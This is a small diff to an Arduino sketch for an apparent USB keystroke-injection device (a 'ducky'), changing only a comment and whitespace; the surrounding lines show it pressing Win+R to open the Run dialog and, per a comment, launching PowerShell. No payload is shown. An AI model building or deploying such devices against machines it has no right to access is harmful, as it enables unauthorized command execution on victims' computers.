@@ -1,7 +1,7 @@
 #include <Keyboard.h>
 
 // Random ID so we can identify our ducky in a later stage. Enter anything. 
-// Just be sure to change this value before uploading to your ducky
+// Just be sure to change this value before uploading to your stick
 String MYID = "123";  
 
 int val = 0;    // variable
@@ -37,7 +37,7 @@ void loop() {
       // Open the Windows executor gui screen
       Keyboard.press(KEY_LEFT_GUI);
       Keyboard.press('r');
-      delay(50);
+      delay(50); 
       Keyboard.releaseAll();
       delay(20);
       // Enter "powershell" and execute
